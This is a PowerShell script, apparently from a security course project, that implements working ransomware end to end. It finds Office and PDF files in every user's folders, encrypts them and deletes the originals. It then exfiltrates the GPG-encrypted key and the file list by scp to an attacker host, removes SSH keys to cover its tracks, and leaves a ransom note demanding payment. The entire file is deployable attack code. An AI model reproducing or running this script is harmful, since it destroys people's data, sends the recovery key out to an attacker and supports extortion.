## Charlie and Bronson SEC-440 Ransomware POC Project
## Requisites to Run:
##  - mypubkey.gpg 
##  - id_rsa (to be associated with id_pub.rsa)
##  - id_rsa.pub (to be used for passwordless SCP, returning encrypted symmetric key

# Define the Target User & System for Attacker:
$scpTarget = "actor@192.168.224.129:"

####################### Download & Install GPG ####################

$uri = 'https://raw.githubusercontent.com/adbertram/Random-Powershell-Work/master/Security/GnuPg.psm1' 

$moduleFolderPath = 'C:\Program Files\WindowsPowerShell\Modules\GnuPg'  

try {

# Create the installation directory, if it's already created and erroring than stop

$null = New-Item -Path $moduleFolderPath -Type Directory -ErrorAction Stop

Invoke-WebRequest -Uri $uri -OutFile (Join-Path -Path $moduleFolderPath -ChildPath 'GnuPg.psm1')

# Install the downloaded GnuPG package, allowing us to use Add-Encryption

Install-GnuPg -DownloadFolderPath $moduleFolderPath

}

catch {" Error: GnuPG is already installed on this system. Proceeding..."}


######################## Generate Symmetric Key ###################

#Add modules to allow for the generation of a symmetric key

add-type -AssemblyName System.Web

# Syntax for creating a password shown below

#[System.Web.Security.Membership]::GeneratePassword(15,0)

$PasswordLength = '32'

$NonAlphaNumeric = '1'

$SecurePassword = [System.Web.Security.Membership]::GeneratePassword($PasswordLength,$NonAlphaNumeric)

# Save the output of this file to a file we can use for encrypting later.

$SecurePassword | Out-File C:\secretkeytodecrypt.txt

######################## Search for Relevant Files ###################

#Get a list of the users on the PC
$ComputerUsers = Get-ChildItem -Path C:\Users |Select-Object -ExpandProperty Name


# We need to define different lists for the files we will be dealing with, 
# this is because Add-Encryption only works with folders, but to remove the
# unencrypted versions we will need the absolute file paths. 
# Prep and Clear the $FilesToEncrypt variable
$FilesToDelete = ''
$FoldersToEncrypt = ''
Clear-Variable -name "FilesToDelete"
Clear-Variable -name "FoldersToEncrypt"

# This for loop goes through the below steps for each user account present on the system:
    # 1. Creates a path to each user folder (Desktop, Documents, Music, Downloads, Videos, & Pictures)
    # 2. Gets a list of child docx, xls, or pdf files from each of those directories.  The results are added to a $filestodelete variable that are used later for the ransom note
    # 3. Encrypts everything in the directories listed in #1
ForEach ($user in $ComputerUsers)
{
   $Desktopdir = "C:\Users\" + $user + "\Desktop"
        $FilesToDelete += Get-childitem -path $Desktopdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object -ExpandProperty FullName
        $FoldersToEncrypt += Get-childitem -path $Desktopdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object Directory

   $Documentsdir =  "C:\Users\" + $user + "\Documents"
        $FilesToDelete += Get-childitem -path $Documentsdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object -ExpandProperty FullName
        $FoldersToEncrypt += Get-childitem -path $Documentsdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object Directory

   
   $Musicdir =  "C:\Users\" + $user + "\Music"
        $FilesToDelete += Get-childitem -path $Musicdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object -ExpandProperty FullName
        $FoldersToEncrypt += Get-childitem -path $Musicdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object Directory
   
   $Downloadsdir =  "C:\Users\" + $user + "\Downloads"
        $FilesToDelete += Get-childitem -path $Downloadsdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object -ExpandProperty FullName
        $FoldersToEncrypt += Get-childitem -path $Downloadsdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object Directory

   $Picturesdir =  "C:\Users\" + $user + "\Pictures"
        $FilesToDelete += Get-childitem -path $Picturesdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object -ExpandProperty FullName
        $FoldersToEncrypt += Get-childitem -path $Picturesdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object Directory

   $videosdir =  "C:\Users\" + $user + "\Videos"
        $FilesToDelete += Get-childitem -path $Videosdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object -ExpandProperty FullName
        $FoldersToEncrypt += Get-childitem -path $Videosdir -include *.docx*,*.xls*,*.pdf* -recurse | Select-Object Directory
}

################ Clean Up Folder Lists, and Encrypt ##################

# Export List of encrypted files for easy decryption later

$FoldersToEncrypt | Out-File encryptedfolders.txt

# Skip the top 3 lines of the file for processing

Get-Content -Path encryptedfolders.txt | Select-Object -Skip 3 > trimmedFolders.txt

# Select only unique lines of the folder list to encrypt. 

$FoldersToEncrypt = Get-Content -Path trimmedFolders.txt | Select-Object -Unique

Remove-Item encryptedFolders.txt

$FoldersToEncrypt | Out-File encryptedFolders.txt
ForEach ($folder in $FoldersToEncrypt) {
       #encrypt all relevant folder paths, using variable holding symmetric key
       try{Add-Encryption -FolderPath $folder -Password $SecurePassword}
       catch{"Error Encrypting " + $folder}
}
##################### Deleting Files After They Have Been Encrypted #################

# This for loop goes through the $filestodelete variable set above, and deletes all of the original, unencrypted files
ForEach ($file in $FilesToDelete)
{    
    #delete original unencrypted files
    try{Remove-Item -Path $file}
    catch{echo "Blank File Path caused improper deletion. Moving on. "}
}

#################### Encrypting and Exporting Symmetric Key with Public Key ####################

$gpgPath = '..\..\..\..\Program Files (x86)\GNU\GnuPG\gpg2.exe'

#import our public key that we downloaded onto the system.

& $gpgPath --import mypubkey.gpg

#pull out the name/ID that we defined for the public keyholder, and store it in id.txt

& $gpgPath --list-keys | findstr uid > id.txt

# Retrieve the Name and email of the encrypting user, and use that to encrypt the symmetric key before sending it 

#Not sure where this file is so I redefined it below   
$userID = Get-Content -Path id.txt -TotalCount 1 | ForEach-Object {$_.substring(24)} 

# delete the file storing the ID information
Remove-Item id.txt

#Non-Interactive trust public GPG key:
$(echo trust; echo 5; echo y; echo quit) | & $gpgPath --command-fd 0 --edit-key $userID

# Below is the encryption, where we are using the name of the current account user 

& $gpgPath -e -r $userID C:\secretkeytodecrypt.txt 

########### Adding Passwordless SCP ##########

# We need to define the path for any existing SSH keys that may be here. 
$keyPath = $env:USERPROFILE+"\.ssh\"

#Now we can add a short try loop that checks/deletes any existing keys
try{Remove-Item -Path $keyPath"id_rsa*"}
catch{echo "Tried Removing Existing SSH Keys. Nothing to Remove."}

Copy-Item -Path id_rsa -Destination $keyPath
Copy-Item -Path id_rsa.pub -Destination $keyPath

# Export encrypted symmetric key back to attacker host using passwordless ssh
scp -o "StrictHostKeyChecking no" C:\secretKeytoDecrypt.txt.gpg $scpTarget

#scp list of encrypted files back to attacker host. 
scp -o "StrictHostKeyChecking no" encryptedFolders.txt $scpTarget

# We will remove the public/private keys we brought with us to prevent future unauthorized access
# this way we also remove "known_hosts" which also covers our tracks. 
Remove-Item -Path $keyPath"*"

##################### Creating Ransom Note, Adding Files Encrypted, Storing on Desktop #################


# define the path for the ransom note to be stored under desktop of current user
$ransomPath = $env:USERPROFILE + "\Desktop\ransom.txt"

# Create a ransom note within the previously defined file path (desktop)
Add-Content -Path $ransomPath -Value "--------------------------------------------"
$note = "All of your personal files (listed below) have been encrypted. Please contact: " + $userID + " to arrange payment for simple and easy recovery of your files."
Add-Content -Path $ransomPath -Value $note
Add-Content -Path $ransomPath -Value "--------------------------------------------"
Add-Content -Path $ransomPath -Value $FilesToDelete
Add-Content -Path $ransomPath -Value "--------------------------------------------"

#remove the folder containing the malware to prevent reverse engineering?
#$malwareDir = $env:USERPROFILE + "\Documents\malware\*"
#Remove-Item -Path $malwareDir

#leave them with only the encrypted version of the symmetric key. 
Remove-Item C:\secretkeytodecrypt.txt